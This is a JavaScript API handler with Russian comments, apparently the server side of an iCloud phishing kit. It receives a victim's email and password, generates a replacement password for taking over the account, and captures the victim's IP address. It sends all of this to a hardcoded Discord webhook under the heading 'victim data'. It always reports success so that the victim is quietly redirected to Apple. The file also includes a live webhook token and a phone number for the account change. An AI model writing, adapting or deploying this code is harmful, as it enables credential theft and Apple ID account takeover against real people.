export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Метод не разрешен' });
  }

  const { email, password } = req.body;

  // Генерируем рандомный пароль для последующей смены (3 цифры + 5 букв + символ)
  function generateRandomPassword() {
    const digits = Math.floor(100 + Math.random() * 900).toString();
    const letters = Array.from({ length: 5 }, () => 
      String.fromCharCode(97 + Math.floor(Math.random() * 26))
    ).join('');
    const symbols = '!@#$%&*';
    const symbol = symbols[Math.floor(Math.random() * symbols.length)];
    return digits + letters + symbol;
  }

  const newPassword = generateRandomPassword();

  // Получаем IP пользователя
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // Твой вебхук (обнови, если надо)
  const webhookUrl = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

  // Формируем сообщение для Discord
  const discordData = {
    content: '@everyone **Новый аккаунт iCloud!**',
    embeds: [
      {
        title: '🔐 Данные жертвы',
        color: 16711680, // красный
        fields: [
          { name: '📧 Почта', value: email, inline: true },
          { name: '🔑 Пароль', value: password, inline: true },
          { name: '🔄 Новый пароль (сгенерирован)', value: newPassword, inline: false },
          { name: '📞 Номер для смены', value: '+7 771 574 70 64 (Казахстан)', inline: false },
          { name: '🌐 IP адрес', value: ip, inline: true }
        ],
        footer: { text: 'Самолет упал, но мы живы' },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    // Отправляем в Discord
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordData)
    });

    // Отправляем успешный ответ, а на фронте сделаем редирект на Apple
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Ошибка отправки в Discord:', error);
    // Даже если Discord упал, возвращаем успех, чтобы редирект сработал
    return res.status(200).json({ success: true });
  }
}
